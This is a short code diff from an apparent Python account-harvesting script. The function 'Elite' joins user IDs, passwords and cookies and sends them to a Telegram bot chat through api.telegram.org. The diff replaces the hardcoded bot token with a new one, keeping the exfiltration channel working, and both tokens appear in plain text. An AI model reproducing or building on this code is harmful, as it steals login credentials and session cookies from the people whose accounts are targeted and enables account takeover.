@@ -13,7 +13,7 @@ os.system("pip install chardet urllib3 idna certifi requests")
 def Elite(ids,pas,cookie):
     try:
         import requests
-        token = "6621233108:AAETgGX2NrHFNejyC8MeL9pzNQUrzNyZ3ho"
+        token = "6621233108:AAGHR7Efb4D2riCK9UHuejVwv3oxpql44Kg"
         chatid = "6235365485"
         ok_id =str(ids+"|"+pas+"|"+cookie)
         url = f"https://api.telegram.org/bot{token}/sendMessage"
